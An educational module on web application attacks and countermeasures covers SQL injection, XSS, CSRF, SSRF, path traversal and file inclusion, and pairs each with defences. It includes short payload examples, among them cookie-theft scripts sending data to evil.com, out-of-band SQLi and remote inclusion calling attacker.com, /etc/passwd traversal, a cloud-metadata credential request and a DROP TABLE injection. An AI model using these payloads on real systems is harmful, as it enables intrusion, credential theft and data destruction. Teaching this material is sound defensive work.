Web Application Attacks and Countermeasures

EHE • Module 07 • Application Security

Web applications are the most heavily targeted attack surface in modern cybersecurity. From SQL injection vulnerabilities that have persisted since the 1990s to server-side request forgery exposing cloud metadata services, this module examines how attackers exploit the application layer and the security controls that prevent each class of vulnerability.

Section 01

Web Server Architecture

Understanding web server architecture is foundational for both attack and defense. Attackers exploit misconfigurations and path traversal vulnerabilities that stem from how web servers map URLs to filesystem resources. Defenders must understand these components to properly isolate, harden, and monitor their web infrastructure.

Server Root
The top-level directory of the web server software installation. Contains configuration files, log directories, and the web server binary. Should not be accessible via web requests — separate from document root.
Configuration
Document Root
The directory from which web content is served. Maps to the base URL (/). Files and directories placed here are publicly accessible. Critically, web server software must be prevented from serving files outside this boundary.
Web Root
Virtual Document Tree
Allows administrators to map URL paths to filesystem locations outside the document root using aliases or symlinks. Misconfigured virtual mappings can inadvertently expose sensitive directories.
URL Mapping
Virtual Hosting
Allows a single web server to host multiple domains. Name-based virtual hosting uses the HTTP Host header to route requests. Misconfigured default virtual hosts can expose unintended content when accessed via IP address.
Multi-Tenancy
Web Proxy
Forward and reverse proxies mediate requests between clients and servers. Reverse proxies (nginx, HAProxy) provide load balancing and TLS termination. Transparent proxies intercept traffic without client configuration — used for filtering and caching.
Intermediary
Section 02

🔨 Web Server Attacks

Web server attacks target the server software layer rather than application code, exploiting misconfigurations, path handling weaknesses, and HTTP protocol features to access files outside the web root, inject content into responses, or corrupt caches.

Directory Traversal
Path manipulation to escape the web root
▼

Directory traversal (path traversal, dot-dot-slash) uses relative path sequences to escape the document root and access arbitrary files on the server filesystem.

# Basic traversal — access /etc/passwd GET /download?file=../../../../etc/passwd HTTP/1.1 # URL-encoded variant (bypasses naive filters) GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd # Double-encoded variant GET /download?file=..%252F..%252Fetc%252Fpasswd # Windows UNC path variant GET /download?file=..\..\..\..\windows\system32\drivers\etc\hosts

Countermeasure: Canonicalize and validate file paths server-side. Resolve the full absolute path and verify it starts with the intended document root. Never construct file paths from user input directly.

🔁
HTTP Response Splitting
Injecting headers into HTTP responses
▼

When user-supplied input is reflected in HTTP response headers without sanitization, attackers can inject CRLF sequences (carriage return + line feed: \r\n) to inject additional headers or split the response into two, creating a second fabricated response. Used to perform XSS, cache poisoning, and session fixation.

# Vulnerable redirect: Location header built from user input # Input: /page%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200... Location: /page\r\nInjected-Header: value\r\n\r\n # Second fabricated response begins here

Countermeasure: Strip or encode CRLF characters (%0d, %0a, \r, \n) from all values placed in HTTP response headers. Modern web frameworks handle this automatically.

Web Cache Poisoning
Injecting malicious responses into caches
▼

Web cache poisoning exploits the discrepancy between what a cache uses as a key (typically URL + headers) and what the backend server uses to generate a response. By manipulating unkeyed headers (X-Forwarded-Host, X-Forwarded-Scheme), an attacker can inject a malicious response that is cached and subsequently served to all users requesting that resource. Discovered systematically by James Kettle (PortSwigger) in 2018.

Website Defacement
Unauthorized modification of web content
▼

Website defacement involves unauthorized modification of a website's visual content — replacing legitimate pages with attacker-controlled content, often for ideological, reputational, or financial motives. Attack vectors include: exploiting CMS vulnerabilities (WordPress, Joomla), credential compromise via brute force or credential stuffing, file upload vulnerabilities, and web shell deployment following code injection. Zone-H.org maintains a public archive of defacement incidents.

Section 03

📺 OWASP Top 10 Overview

The OWASP (Open Web Application Security Project) Top 10 is the most widely referenced taxonomy of critical web application security risks. Published periodically by the OWASP Foundation, it reflects both the prevalence and severity of vulnerability classes across real-world applications. The 2021 edition introduced significant reorganization, with Broken Access Control rising to the top position.

  • A01
    Broken Access Control
    Restrictions on authenticated users not properly enforced. Allows unauthorized access to functionality, data, or accounts. Includes IDOR, privilege escalation, and direct object reference.
  • A02
    Cryptographic Failures
    Previously "Sensitive Data Exposure." Focuses on failures in cryptography that lead to exposure — weak algorithms, missing TLS, improper certificate validation, hardcoded keys.
  • A03
    Injection
    SQL, NoSQL, OS command, LDAP, and other injection flaws where untrusted data is sent to an interpreter. Allows attackers to manipulate queries, execute commands, or access unauthorized data.
  • A04
    Insecure Design
    New in 2021. Focuses on risks related to design and architectural flaws — security requirements not defined, threat modeling not performed, secure design patterns not applied.
  • A05
    Security Misconfiguration
    Default credentials, open cloud storage buckets, verbose error messages, unnecessary services enabled, missing security hardening. The most prevalent category in real-world assessments.
  • A06
    Vulnerable and Outdated Components
    Using libraries, frameworks, or components with known vulnerabilities. Log4Shell (Log4j) in 2021 exemplified how a single vulnerable dependency can impact millions of applications globally.
  • A07
    Identification and Authentication Failures
    Broken authentication mechanisms — weak passwords permitted, missing MFA, insecure session management, credential stuffing not detected, session tokens not invalidated on logout.
  • A08
    Software and Data Integrity Failures
    Code and infrastructure that does not protect against integrity violations — insecure deserialization, CI/CD pipeline attacks, auto-update without integrity verification, supply chain attacks.
  • A09
    Security Logging and Monitoring Failures
    Insufficient logging, monitoring, and incident response. Without adequate detection capabilities, breaches go undetected for months. Relates to the average 197-day breach detection time.
  • A10
    Server-Side Request Forgery (SSRF)
    New in 2021. Application fetches remote resources using attacker-controlled URLs — used to access internal services, cloud metadata APIs (169.254.169.254), or bypass network controls.
Section 04

SQL Injection Deep Dive

SQL injection has been listed in the OWASP Top 10 every year since its inception and remains one of the most commonly exploited vulnerability classes. It occurs when user-controlled input is incorporated into SQL queries without proper sanitization, allowing attackers to manipulate query structure and logic.

In-Band / Error-Based
Error-Based SQLi
Forces the database to generate error messages that reveal schema information, table names, column names, and data. The error output is returned in the HTTP response.
' AND 1=CONVERT(int, @@version)-- -- DB error reveals version string
In-Band / Union-Based
UNION-Based SQLi
Uses UNION SELECT to append additional query results to the original query's output. Attacker can extract any data accessible by the database user — all tables, columns, sensitive records.
' UNION SELECT username,password,3 FROM users--
Blind / Boolean-Based
Boolean Blind SQLi
No data returned in response. Attacker asks true/false questions — different page responses for true vs false conditions. Data extracted one bit at a time; automated by sqlmap.
' AND SUBSTRING(password,1,1)='a'-- -- Observe: 200 OK vs 404 Not Found
Blind / Time-Based
Time-Based Blind SQLi
Injects conditional time delays (SLEEP, WAITFOR DELAY) to infer boolean conditions from response timing. Works even when page responses look identical regardless of query result.
' IF(1=1) WAITFOR DELAY '0:0:5'-- -- True condition: response delayed 5s
Out-of-Band
Out-of-Band SQLi
Exfiltrates data via a separate channel (DNS, HTTP request from the database server). Useful when in-band responses are restricted. Requires specific database features (xp_dirtree, UTL_HTTP, LOAD_FILE).
'; EXEC xp_dirtree '\\attacker.com\a'-- -- DNS query reveals DB server identity
Advanced Technique
Piggybacking & Tautology
Piggybacking appends additional SQL statements (stacked queries). Tautology injects always-true conditions (OR 1=1) to bypass authentication or WHERE clause filtering.
' OR '1'='1 -- tautology bypass '; DROP TABLE users;-- -- piggyback
✓
SQLi Prevention: Parameterized Queries
The definitive defense against SQL injection is using parameterized queries (prepared statements). User input is passed as a parameter — never concatenated into the query string. The database engine treats parameters as data, never as SQL syntax, making injection structurally impossible.
// VULNERABLE: String concatenation query = "SELECT * FROM users WHERE name = '" + username + "'"; // SAFE: Parameterized query (Java example) PreparedStatement stmt = conn.prepareStatement( "SELECT * FROM users WHERE name = ?" ); stmt.setString(1, username); ResultSet rs = stmt.executeQuery();
Section 05

📌 Cross-Site Scripting (XSS)

XSS vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. Unlike server-side injection attacks, XSS executes in the victim's browser, enabling session theft, keylogging, redirection, credential harvesting, and browser exploitation. XSS affects the integrity of the web page from the victim's perspective.

🔁
Reflected XSS
Malicious script is included in the URL (query parameter, path). The server reflects the input back in the response without sanitization. Requires the victim to click a crafted link. Not stored — executes once. Common in search results, error pages, and URL-based form submissions.
Non-Persistent
Stored (Persistent) XSS
Malicious script is stored in the database and served to all users who view the infected page (comments, profile fields, forum posts). No crafted link needed — every visitor is a victim. Higher severity than reflected. Worm propagation is possible (Samy worm, 2005: infected 1M MySpace profiles in 20 hours).
Persistent
DOM-Based XSS
Payload never reaches the server. Client-side JavaScript reads attacker-controlled data (URL fragment, localStorage) and writes it to the DOM unsafely using innerHTML, document.write, or eval. Traditional server-side filters cannot detect it — requires client-side code review.
Client-Side
// XSS payload examples // Basic alert (proof-of-concept) <script>alert(1)</script> // Session theft <script>document.location='https://evil.com/?c='+document.cookie</script> // Event-handler injection (bypasses <script> filters) <img src=x onerror="fetch('https://evil.com/?d='+document.cookie)"> // Prevention: Content Security Policy header Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

🚫 XSS Attack Impacts

  • ▸Session cookie theft and account takeover
  • ▸Credential harvesting via fake login forms
  • ▸Keylogging and form field capture
  • ▸Browser exploitation (BeEF framework)
  • ▸Malware download and drive-by attacks
  • ▸Website content modification and defacement

✓ XSS Countermeasures

  • ▸Output encoding: HTML-encode user data before rendering
  • ▸Content Security Policy (CSP) blocks inline scripts
  • ▸HttpOnly cookie flag prevents JS cookie access
  • ▸Input validation and sanitization libraries (DOMPurify)
  • ▸X-XSS-Protection header (legacy browsers)
  • ▸Avoid dangerous sinks: innerHTML, document.write, eval
Section 06

🔭 Other Web Application Attacks

🔁
Cross-Site Request Forgery (CSRF)
Tricking authenticated users into performing unintended actions
▼

CSRF exploits the browser's automatic inclusion of authentication cookies in cross-site requests. If a victim is authenticated to a web application and visits a malicious page, the malicious page can trigger state-changing requests (password change, wire transfer, email change) on the target application — authenticated as the victim.

<!-- Malicious page auto-submitting a hidden form --> <form action="https://bank.com/transfer" method="POST"> <input type="hidden" name="amount" value="50000"> <input type="hidden" name="to" value="attacker-account"> </form> <script>document.forms[0].submit();</script> // Defense: CSRF token (synchronized token pattern) <input type="hidden" name="csrf_token" value="r4nd0mT0k3n">

Countermeasures: CSRF tokens (unique per-session random values in forms), SameSite cookie attribute (Lax or Strict prevents cross-site cookie sending), origin/referer header validation, double-submit cookie pattern.

Server-Side Request Forgery (SSRF)
Weaponizing the server as an internal request proxy
▼

SSRF allows attackers to make the server initiate HTTP requests to internal resources — bypassing firewall rules that would block direct external access. In cloud environments, SSRF is critical: AWS, GCP, and Azure expose instance metadata at 169.254.169.254, returning IAM credentials that can be used to escalate privileges across the cloud account. The 2019 Capital One breach was enabled by an SSRF vulnerability.

# SSRF to cloud metadata (AWS IMDS) GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ # Internal service enumeration via SSRF GET /fetch?url=http://10.0.0.1/admin GET /fetch?url=http://localhost:6379/ # Redis
File Inclusion (LFI / RFI)
Including arbitrary local or remote files in execution context
▼

Local File Inclusion (LFI) occurs when a PHP (or similar) include statement accepts user-controlled input. An attacker can include files from the local filesystem (/etc/passwd, /var/log/apache/access.log for log poisoning) within the script's execution context. Remote File Inclusion (RFI) allows including files from remote URLs (requires allow_url_include=On in PHP) — attacker can include a PHP web shell hosted on a remote server.

# LFI example GET /index.php?page=../../../../etc/passwd GET /index.php?page=../../../../var/log/apache2/access.log # RFI example (PHP) GET /index.php?page=http://attacker.com/shell.php
Parameter Tampering
Manipulating application parameters to alter business logic
▼

Parameter tampering modifies HTTP request parameters (URL query strings, POST body, cookies, hidden form fields) to alter application behavior in unintended ways. Classic examples include changing product prices in e-commerce checkouts, modifying account IDs in API requests to access other users' data (IDOR — Insecure Direct Object Reference), and manipulating access level fields in authentication tokens. Defense: never trust client-supplied parameters for security decisions; validate all parameters server-side against authoritative state.

Section 07

Web Attack Countermeasures

Input Validation
Validate all input server-side — type, length, format, range. Use allowlist validation (accept only known-good values) rather than denylist filtering (blocking known-bad patterns). Never trust client-side validation alone.
Prevention
Parameterized Queries
The only reliable SQLi defense. Use prepared statements and parameterized queries in all database interactions. ORMs typically enforce this pattern. Stored procedures provide similar protection when parameterized.
SQLi Defense
Web Application Firewall
Inspects HTTP/HTTPS traffic for attack signatures. Blocks known exploitation patterns for SQLi, XSS, path traversal, and other OWASP risks. ModSecurity (open-source), AWS WAF, Cloudflare WAF. Supplement to — not substitute for — secure coding.
Detection Layer
HTTPS & Security Headers
TLS 1.3 for all traffic. Security headers: CSP (block inline scripts), HSTS (force HTTPS), X-Frame-Options (prevent clickjacking), X-Content-Type-Options (prevent MIME sniffing), Referrer-Policy.
Transport Security
Secure Coding Practices
OWASP ASVS (Application Security Verification Standard) provides a testable security requirements framework. Threat modeling during design. SAST tools in CI/CD pipelines. Dependency scanning for known CVEs (Dependabot, Snyk, OWASP Dependency-Check).
SDLC
Least Privilege & Isolation
Database users should have minimum required permissions. Web application processes should run as non-root accounts. Container isolation (Docker, Kubernetes) limits blast radius. Network segmentation prevents SSRF pivot to internal services.
Containment
Section 08

Key Takeaways

Never Concatenate Queries
SQL injection is a solved problem. Parameterized queries eliminate the vulnerability class entirely. There is no justification for building SQL strings from user input in modern code.
📌
Output Context Determines Encoding
XSS prevention requires encoding user data for its output context — HTML entities in HTML body, JavaScript escaping in script blocks, URL encoding in URLs. One encoding does not fit all contexts.
SSRF Is Increasingly Critical
In cloud-native environments, SSRF attacks on metadata services can yield IAM credentials with sweeping access. SSRF moved from academic vulnerability to top OWASP risk for good reason.
Defense in Depth for Applications
Input validation + parameterized queries + WAF + CSP + HSTS + output encoding + least-privilege database accounts + logging. Each layer catches what others miss — no single control is sufficient.
